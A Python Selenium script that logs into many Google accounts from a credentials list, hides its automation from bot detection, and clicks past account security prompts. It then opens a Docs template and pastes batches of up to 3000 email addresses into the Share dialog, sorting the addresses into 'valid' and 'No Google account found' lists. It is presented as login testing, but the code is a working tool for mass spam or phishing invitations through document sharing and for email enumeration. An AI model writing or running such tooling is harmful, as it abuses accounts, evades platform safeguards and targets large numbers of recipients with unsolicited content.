#!/usr/bin/env python3

import csv
import time
import random
import re
import sys
import os
import traceback

from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.options import Options as ChromeOptions
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

LOGIN_URL = "https://docs.google.com/document"
CREDENTIALS_FILE = "credentials.txt"
RESULTS_FILE = "login_test_results.csv"

WAIT_SECONDS = 10
DELAY_BETWEEN_ATTEMPTS = 2
NEXT_BUTTON_TEXTS = ["Next", "Continue", "Sign in", "Log in", "Login"]

EMAIL_INPUT_SELECTOR = (By.ID, "identifierId")
PASSWORD_INPUT_SELECTOR = (By.NAME, "Passwd")

CONSENT_CHECKBOX_SELECTOR = (By.CSS_SELECTOR, "input.mdc-checkbox__native-control")
AGREE_BUTTON_XPATH = "//*[contains(text(), 'Agree and continue')]"
DOWNLOAD_DIR = os.path.join(os.path.expanduser("~"), "Downloads")

TEXT_FILE_PATH = "Text File.txt"
INPUT_FALLBACK_PATH = "input.txt"
CONF_PATH = "conf"
VALID_OUTPUT_PATH = "valid.txt"
ERROR_OUTPUT_PATH = "error.txt"

add_user_batch_size = 0
all_add_users = []
global_email_index = 0


def load_config_and_emails():
    global add_user_batch_size, all_add_users

    add_user_batch_size = 0
    try:
        cfg_file = "config"
        with open(cfg_file, "r", encoding="utf-8") as cf:
            for ln in cf:
                ln = ln.strip()
                if not ln or ln.startswith("#"):
                    continue
                if "=" in ln:
                    k, v = ln.split("=", 1)
                    k = k.strip().lower()
                    v = v.strip()
                    if k == "add_user":
                        try:
                            add_user_batch_size = int(v)
                        except ValueError:
                            pass
    except FileNotFoundError:
        pass
    except Exception:
        pass

    add_user_filename = "add_user.txt"
    try:
        with open(add_user_filename, "r", encoding="utf-8") as auf:
            all_add_users = [line.strip() for line in auf if line.strip()]
    except FileNotFoundError:
        pass
    except Exception:
        pass


def get_email_input_path():
    if os.path.exists(TEXT_FILE_PATH):
        return TEXT_FILE_PATH
    if os.path.exists(INPUT_FALLBACK_PATH):
        return INPUT_FALLBACK_PATH
    return TEXT_FILE_PATH


def read_limit_from_conf(conf_path=CONF_PATH):
    default_limit = 3000
    try:
        if not os.path.exists(conf_path):
            return default_limit
        with open(conf_path, "r", encoding="utf-8", errors="ignore") as f:
            for line in f:
                s = line.strip()
                if not s or s.startswith("#"):
                    continue
                if s.lower().startswith("limit="):
                    try:
                        val = int(s.split("=", 1)[1].strip())
                        if val > 0:
                            return val
                    except ValueError:
                        pass
    except Exception:
        pass
    return default_limit


def normalize_line(line):
    return " ".join((line or "").split())


def write_unique_lines(path, values):
    if not values:
        return
    existing = set()
    if os.path.exists(path):
        with open(path, "r", encoding="utf-8", errors="ignore") as f:
            existing = {ln.strip() for ln in f if ln.strip()}
    new_values = [v for v in values if v not in existing]
    if not new_values:
        return
    with open(path, "a", encoding="utf-8") as f:
        for v in new_values:
            f.write(v + "\n")


def parse_email_lines(lines):
    valid = []
    errors = []
    seen_valid = set()
    seen_error = set()

    for raw in lines:
        line = normalize_line(raw)
        if not line:
            continue

        if "No Google account found" in line:
            if line not in seen_error:
                errors.append(line)
                seen_error.add(line)
            continue

        emails = re.findall(r"[A-Za-z0-9._%+\-]+@[A-Za-z0-9.\-]+\.[A-Za-z]{2,}", line)
        if not emails:
            continue

        if len(emails) == 1 and line == emails[0]:
            continue

        selected = None
        if len(emails) >= 2 and len(set(emails)) == 1:
            selected = emails[0]
        elif len(emails) == 1 and len(line) > len(emails[0]) + 1:
            selected = emails[0]
        elif len(emails) >= 2:
            selected = emails[0]

        if selected and selected not in seen_valid:
            valid.append(selected)
            seen_valid.add(selected)

    return valid, errors


def wait_for_share_modal(driver, timeout=20):
    end_time = time.time() + timeout
    while time.time() < end_time:
        try:
            for d in driver.find_elements(By.XPATH, "//div[@role='dialog']"):
                try:
                    if d.is_displayed():
                        return d
                except Exception:
                    pass
        except Exception:
            pass

        try:
            h = driver.find_element(By.XPATH, "//*[contains(text(), 'Share \"Resume\"') or contains(@aria-label, 'Share')]")
            if h.is_displayed():
                return h
        except Exception:
            pass

        time.sleep(0.3)
    return None


def find_share_people_input(driver, timeout=20):
    end_time = time.time() + timeout
    dialog = wait_for_share_modal(driver, timeout=5)

    selectors = [
        (By.CSS_SELECTOR, "input.zeumMd.d2j1H[role='combobox'][jsname='YPqjbf']"),
        (By.CSS_SELECTOR, "div[jsname='w1sQPc'] input[jsname='YPqjbf']"),
        (By.CSS_SELECTOR, "div[jsname='w1sQPc'] input[aria-label='Add people, groups, spaces, and calendar events']"),
        (By.CSS_SELECTOR, "input[role='combobox'][jsname='YPqjbf']"),
        (By.CSS_SELECTOR, "input[aria-label='Add people, groups, spaces, and calendar events']"),
        (By.CSS_SELECTOR, "input[jsname='YPqjbf']"),
        (By.XPATH, "//div[jsname='w1sQPc']//input[@jsname='YPqjbf']"),
        (By.XPATH, "//div[@role='dialog']//input[@jsname='YPqjbf']"),
        (By.XPATH, "//input[@role='combobox' and @jsname='YPqjbf']"),
        (By.XPATH, "//input[@aria-label='Add people, groups, spaces, and calendar events']"),
    ]

    while time.time() < end_time:
        if dialog is not None:
            for by, selector in selectors:
                try:
                    candidates = dialog.find_elements(by, selector)
                    for el in candidates:
                        try:
                            if el.is_displayed() and el.is_enabled():
                                return el
                        except Exception:
                            pass
                except Exception:
                    pass

        for by, selector in selectors:
            try:
                for el in driver.find_elements(by, selector):
                    try:
                        if el.is_displayed() and el.is_enabled():
                            return el
                    except Exception:
                        pass
            except Exception:
                pass

        time.sleep(0.25)

    return None


def click_share_field(driver, input_field):
    try:
        driver.execute_script("""
            arguments[0].scrollIntoView({block: 'center', inline: 'center'});
            arguments[0].focus();
            arguments[0].click();
        """, input_field)
        time.sleep(0.4)
        return True
    except Exception:
        try:
            input_field.click()
            time.sleep(0.3)
            return True
        except Exception:
            return False


def type_email_into_share_box(driver, input_field, email):
    email = str(email).strip()
    if not email:
        return False

    try:
        click_share_field(driver, input_field)
        try:
            input_field.clear()
        except Exception:
            pass

        input_field.send_keys(email)
        time.sleep(0.5)

        driver.execute_script("""
            arguments[0].dispatchEvent(new Event('input', {bubbles: true}));
            arguments[0].dispatchEvent(new Event('change', {bubbles: true}));
        """, input_field)

        time.sleep(0.4)
        return True
    except Exception:
        return False


def paste_batch_no_enter(driver, emails):
    input_field = find_share_people_input(driver, timeout=20)
    if input_field is None:
        print("  Share dialog email input not found after clicking Share.")
        return False

    if not click_share_field(driver, input_field):
        print("  Found share field but could not click it.")
        return False

    try:
        for email in emails:
            email = str(email).strip()
            if not email:
                continue
            type_email_into_share_box(driver, input_field, email)
            time.sleep(0.3)
        print(f"  Added {len([e for e in emails if str(e).strip()])} recipients without pressing Enter.")
        return True
    except Exception as e:
        print(f"  Failed to paste emails without Enter: {e}")
        return False


def process_email_file_in_batches(driver, input_path, limit):
    try:
        with open(input_path, "r", encoding="utf-8", errors="ignore") as f:
            lines = [ln.strip() for ln in f if ln.strip()]
    except FileNotFoundError:
        print(f"  Input file not found: {input_path}")
        return

    if not lines:
        print("  No lines found in input file.")
        return

    total_batches = (len(lines) + limit - 1) // limit
    print(f"  Processing {len(lines)} lines in {total_batches} batch(es) with limit={limit}")

    for batch_index in range(0, len(lines), limit):
        batch = lines[batch_index:batch_index + limit]
        print(f"  Batch {batch_index // limit + 1}/{total_batches}: {len(batch)} lines")

        email_input = find_share_people_input(driver, timeout=20)
        if not email_input:
            print("  Could not find the share dialog email input; skipping batch.")
            continue

        try:
            if not paste_batch_no_enter(driver, batch):
                print("  Batch paste failed; skipping batch.")
                continue
        except Exception as e:
            print(f"  Batch paste raised exception: {e}")
            continue

        time.sleep(15)

        valid_list, error_list = parse_email_lines(batch)
        write_unique_lines(VALID_OUTPUT_PATH, valid_list)
        write_unique_lines(ERROR_OUTPUT_PATH, error_list)

        print(f"  Valid emails saved: {len(valid_list)}")
        print(f"  Error lines saved: {len(error_list)}")

        try:
            driver.find_element(By.TAG_NAME, "body").send_keys(Keys.ESCAPE)
        except Exception:
            pass

        time.sleep(1)


def click_next_button(driver):
    for text in NEXT_BUTTON_TEXTS:
        xpath = (
            f"//button[contains(normalize-space(.), '{text}')] | "
            f"//input[@type='submit' and contains(@value, '{text}')] | "
            f"//*[@role='button' and contains(normalize-space(.), '{text}')]"
        )
        elements = driver.find_elements(By.XPATH, xpath)
        for el in elements:
            try:
                if el.is_displayed() and el.is_enabled():
                    el.click()
                    return True
            except Exception:
                continue
    return False


def find_visible_input(driver, input_type, manual_selector=None):
    try:
        if manual_selector:
            candidates = driver.find_elements(*manual_selector)
        else:
            candidates = driver.find_elements(By.CSS_SELECTOR, f"input[type='{input_type}']")
        for el in candidates:
            if el.is_displayed():
                return el
    except Exception:
        pass
    return None


def wait_for_visible_input(driver, input_type, manual_selector=None, timeout=30):
    end_time = time.time() + timeout
    while time.time() < end_time:
        el = find_visible_input(driver, input_type, manual_selector)
        if el:
            return el
        time.sleep(0.3)
    return None


def check_outcome(driver):
    end_time = time.time() + WAIT_SECONDS
    while time.time() < end_time:
        try:
            if "/dashboard" in driver.current_url:
                return "SUCCESS"
        except Exception:
            pass
        time.sleep(0.3)
    return "UNKNOWN"


def click_google_docs_share_button(driver):
    for attempt in range(12):
        try:
            result = driver.execute_script("""
            const wrapper = document.querySelector('#docs-titlebar-share-client-button');
            if (!wrapper) return {ok: false, reason: 'wrapper_not_found'};
            const btn = wrapper.querySelector('div[role="button"][aria-label="Share. Private to only me. "]');
            if (!btn) return {ok: false, reason: 'button_not_found'};
            const rect = btn.getBoundingClientRect();
            if (!rect.width || !rect.height) return {ok: false, reason: 'not_visible'};
            const style = window.getComputedStyle(btn);
            if (style.pointerEvents === 'none' || style.display === 'none' || style.visibility === 'hidden') {
                return {ok: false, reason: 'blocked_by_css'};
            }
            btn.scrollIntoView({block: 'center', inline: 'center'});
            btn.dispatchEvent(new MouseEvent('mousedown', {bubbles: true}));
            btn.dispatchEvent(new MouseEvent('mouseup', {bubbles: true}));
            btn.dispatchEvent(new MouseEvent('click', {bubbles: true, cancelable: true}));
            return {ok: true, reason: 'clicked'};
            """)
            print(f"  Share button attempt {attempt + 1}: {result}")

            time.sleep(1)

            share_modal = driver.execute_script("""
            const cands = ['[role="dialog"]', '[aria-label*="Share"]', '[aria-label*="People"]', '[aria-label*="Invite"]'];
            for (const sel of cands) {
                if (document.querySelector(sel)) return true;
            }
            return false;
            """)
            if share_modal:
                return True

        except Exception as e:
            print(f"  Share button JS failed: {e}")
        time.sleep(1)

    print("  Share button still not clickable from live DOM.")
    return False


def attempt_login(driver, email, password):
    global global_email_index, add_user_batch_size, all_add_users

    def click_remind_me_later(timeout=3):
        try:
            try:
                btn = WebDriverWait(driver, timeout).until(
                    EC.element_to_be_clickable(
                        (By.XPATH, "//span[contains(@class,'mdc-button__label') and normalize-space(.)='Remind me later']/ancestor::button[1]")
                    )
                )
                driver.execute_script("arguments[0].click();", btn)
                time.sleep(0.8)
                return True
            except Exception:
                spans = driver.find_elements(By.XPATH, "//span[contains(@class,'mdc-button__label') and normalize-space(.)='Remind me later']")
                if spans:
                    try:
                        driver.execute_script("arguments[0].click();", spans[0])
                        time.sleep(0.8)
                        return True
                    except Exception:
                        try:
                            spans[0].click()
                            time.sleep(0.8)
                            return True
                        except Exception:
                            pass
        except Exception:
            pass
        return False

    def click_do_this_later(timeout=4):
        try:
            do_later = WebDriverWait(driver, timeout).until(
                EC.element_to_be_clickable((By.XPATH, "//a[normalize-space(.)='Do this later' or contains(normalize-space(.),'Do this later')]"))
            )
            driver.execute_script("arguments[0].click();", do_later)
            time.sleep(1)
            return True
        except Exception:
            try:
                anchors = driver.find_elements(By.XPATH, "//a[contains(@href,'ServiceLogin') and (normalize-space(.)='Do this later' or contains(normalize-space(.),'Do this later'))]")
                if anchors:
                    driver.execute_script("arguments[0].click();", anchors[0])
                    time.sleep(1)
                    return True
            except Exception:
                pass
        return False

    outcome = "UNKNOWN"
    driver.get(LOGIN_URL)

    email_field = wait_for_visible_input(driver, "email", EMAIL_INPUT_SELECTOR)
    if not email_field:
        return "ERROR (no email field)"
    try:
        email_field.clear()
    except Exception:
        pass
    email_field.send_keys(email)
    time.sleep(1)

    if not click_next_button(driver):
        return "ERROR (no next button, step 1)"

    password_field = wait_for_visible_input(driver, "password", PASSWORD_INPUT_SELECTOR)
    if not password_field:
        return "FAILED (bad email or no password step)"
    try:
        password_field.clear()
    except Exception:
        pass
    password_field.send_keys(password)
    time.sleep(3)

    if not click_next_button(driver):
        return "ERROR (no next button, step 2)"

    try:
        iunder = WebDriverWait(driver, 4).until(
            EC.element_to_be_clickable((By.XPATH, "//span[@jsname='V67aGc' and normalize-space(.)='I understand']"))
        )
        driver.execute_script("arguments[0].click();", iunder)
        time.sleep(1)
    except Exception:
        pass

    try:
        if click_remind_me_later(timeout=3):
            pass
    except Exception:
        pass

    try:
        if click_do_this_later(timeout=4):
            pass
    except Exception:
        pass

    time.sleep(1)

    if CONSENT_CHECKBOX_SELECTOR:
        try:
            checkbox = WebDriverWait(driver, 3).until(
                EC.presence_of_element_located(CONSENT_CHECKBOX_SELECTOR)
            )
            driver.execute_script("arguments[0].click();", checkbox)
            time.sleep(1)

            agree_btn = WebDriverWait(driver, 3).until(
                EC.presence_of_element_located((By.XPATH, AGREE_BUTTON_XPATH))
            )
            driver.execute_script("arguments[0].click();", agree_btn)
            time.sleep(3)
        except Exception:
            pass

    try:
        print("  Starting email batch share flow after successful login.")
        time.sleep(10)

        try:
            template_img = WebDriverWait(driver, 20).until(
                EC.element_to_be_clickable(
                    (By.XPATH, "//img[contains(@src, '1wyFqxsRmKm9q--7j4WRmBMn694YdhV6hmNrfh4rVm2E_400.png')]")
                )
            )
            driver.execute_script("arguments[0].scrollIntoView(true); arguments[0].click();", template_img)
        except Exception:
            pass

        time.sleep(25)

        try:
            if not click_google_docs_share_button(driver):
                print("  Sharing flow aborted: share button not clickable from live DOM.")
                return outcome
        except Exception:
            raise

        time.sleep(10)

        limit = read_limit_from_conf()
        input_path = get_email_input_path()
        process_email_file_in_batches(driver, input_path, limit)
    except Exception as e:
        print(f"  Error in share/email batch flow: {e}")

    return outcome


def main():
    load_config_and_emails()

    creds = []
    try:
        with open(CREDENTIALS_FILE, "r", encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if not line or "|" not in line:
                    continue
                email, password = line.split("|", 1)
                creds.append((email.strip(), password.strip()))
    except FileNotFoundError:
        print(f"{CREDENTIALS_FILE} not found.")
        return
    except Exception as e:
        print(f"Error reading credentials: {e}")
        return

    print(f"Loaded {len(creds)} credential pairs from {CREDENTIALS_FILE}")

    chrome_options = ChromeOptions()
    chrome_options.add_experimental_option("excludeSwitches", ["enable-automation"])
    chrome_options.add_experimental_option("useAutomationExtension", False)
    chrome_options.add_argument("--disable-blink-features=AutomationControlled")
    chrome_options.add_argument("--guest")

    prefs = {
        "download.default_directory": DOWNLOAD_DIR,
        "download.prompt_for_download": False,
        "download.directory_upgrade": True,
        "profile.default_content_settings.popups": 0,
        "profile.default_content_setting_values.automatic_downloads": 1,
    }
    chrome_options.add_experimental_option("prefs", prefs)

    results = []

    driver = None
    try:
        for i, (email, password) in enumerate(creds, 1):
            print(f"[{i}/{len(creds)}] Testing {email} ...")
            try:
                driver = webdriver.Chrome(options=chrome_options)
                try:
                    driver.execute_cdp_cmd(
                        "Page.addScriptToEvaluateOnNewDocument",
                        {"source": "Object.defineProperty(navigator, 'webdriver', {get: () => undefined})"},
                    )
                except Exception:
                    pass

                outcome = attempt_login(driver, email, password)
            except Exception as e:
                print(f"  attempt_login raised: {e}")
                outcome = "ERROR"
            finally:
                try:
                    if driver is not None:
                        driver.quit()
                except Exception:
                    pass
                driver = None

            print(f"  -> {outcome}")
            results.append((email, outcome))
            time.sleep(DELAY_BETWEEN_ATTEMPTS)
    finally:
        if driver is not None:
            try:
                driver.quit()
            except Exception:
                pass

    with open(RESULTS_FILE, "w", newline="", encoding="utf-8") as f:
        writer = csv.writer(f)
        writer.writerow(["email", "result"])
        writer.writerows(results)

    print(f"\nDone. Results saved to {RESULTS_FILE}")


if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        print("\n" + "=" * 60)
        print("SCRIPT CRASHED WITH AN ERROR:")
        traceback.print_exc()
        print("=" * 60)
        print(f"\nError summary: {e}")
    finally:
        try:
            input("\nPress Enter to close this window...")
        except Exception:
            pass
